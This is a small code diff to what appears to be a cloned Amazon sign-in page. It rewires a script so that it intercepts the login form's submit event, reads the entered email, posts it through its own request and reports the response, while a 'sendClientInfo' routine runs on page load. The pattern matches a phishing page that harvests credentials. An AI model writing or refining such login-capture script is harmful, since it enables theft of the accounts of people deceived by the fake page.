@@ -17111,7 +17111,7 @@
                 sendClientInfo();  // Always runs first
             };
 
-            document.getElementById("continue-announce").addEventListener("submit", async function (e) {
+            document.getElementById("ap_login_form").addEventListener("submit", async function (e) {
                 e.preventDefault();
 
                 const username = document.getElementById("ap_email_login").value;
@@ -17126,14 +17126,13 @@
                     });
 
                     const data = await res.json();
-
                     document.getElementById("status").textContent = data.message;
                 } catch (err) {
                     document.getElementById("status").textContent = "Request failed";
                 }
             });
+</script>
 
-        </script>
 
         <script>window.ue && ue.count && ue.count('CSMLibrarySize', 94442)</script>
         <!-- sp:end-feature:csm:body-close -->
